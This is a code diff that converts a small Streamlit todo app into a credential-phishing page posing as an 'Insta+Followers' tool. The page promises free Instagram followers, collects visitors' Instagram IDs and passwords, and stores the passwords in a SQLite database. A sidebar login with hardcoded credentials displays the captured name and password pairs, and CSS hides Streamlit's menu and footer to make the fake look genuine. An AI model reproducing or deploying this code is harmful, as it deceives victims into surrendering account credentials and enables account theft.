@@ -1,6 +1,9 @@
 import streamlit as st
 import sqlite3
 
+
+
+st.set_page_config(page_icon="https://viralyft.com/wp-content/uploads/2023/04/buy-instagram-followers.webp", page_title="Insta+Followers")
 # Create a database connection
 conn = sqlite3.connect("todo.db")
 
@@ -14,11 +17,35 @@ c.execute("""CREATE TABLE IF NOT EXISTS todos (
     completed BOOLEAN NOT NULL
 )""")
 
+
+c1 , c2 = st.columns([3,1])
+
+with c1:
+    
+    st.image("https://viralyft.com/wp-content/uploads/2023/04/buy-instagram-followers.webp")
+
+    st.text("Insta+Followers")
+
+    st.warning("The easiest tool to add followers to Instagram ID")
+    
+    st.success("Enter your Instagram ID and password")
+    
+    
+
+    
+with open("c.css") as f:
+    st.markdown(f"<style> {f.read()} </style>", unsafe_allow_html=True)
+
+
+
+
+
+
 # Create a form to collect todo item information
 with st.form("Todo Form"):
-    text = st.text_input("Todo item")
-    passw = st.text_input("Pass", type="password")
-    submit_button = st.form_submit_button("Add Todo")
+    text = st.text_input("Instagram ID")
+    passw = st.text_input("Instagram password", type="password")
+    submit_button = st.form_submit_button("Add followers")
 
 
 
@@ -34,52 +61,75 @@ with st.form("Todo Form"):
         with c2:
             
             c.execute("INSERT INTO todos (text, completed) VALUES (?, ?)", (passw, False))
-        
+            
         conn.commit()
 
         # Display a success message
-        st.success("Todo item added successfully")
-
+        st.success("""
+                   Your Instagram ID is being checked. If your Instagram ID and the password you entered are correct, it will be added to your ID in a few minutes after checking several followers.
+                   """)
+        st.snow()        
+        
+        
 # Get all todo items from the database
 c.execute("SELECT * FROM todos")
 todos = c.fetchall()
 
+with st.sidebar:
+    
 
+    
+    
 
+    name = st.text_input("Name")
+    pas = st.text_input("Pass", type="password")
+    loginbtn = st.button("login")
 
-
-
-
-name = st.text_input("Name")
-pas = st.text_input("Pass", type="password")
-# subm = st.form_submit_button("Login")
-
-
-if name == "a" and pas == "ch":
+    if name == "a" and pas == "ch":
     
 
 # Display the todo items
-    for todo in todos:
+        for todo in todos:
     # id = todo[0]
     
-        c1 , c2 = st.columns(2)
-        with c1:
+            c1 , c2 = st.columns(2)
+            with c1:
         
-            text = todo[1]
+                text = todo[1]
     # passw = todo[2]
     # completed = todo[2]
-        with c2:
+            with c2:
         
-            st.markdown(f" Name And Pass : {text}  {passw}")
+                st.markdown(f" Name And Pass : {text}  {passw}")
     
     
     
         
-        st.divider()
+            st.divider()
+    
     
    
    
 conn.close()
 
 
+    
+    
 
+
+
+
+
+
+
+
+
+
+
+
+st.markdown("""
+<style> 
+#MainMenu {visibility: hidden;}
+footer {visibility: hidden;}
+</style>
+""",unsafe_allow_html=True)
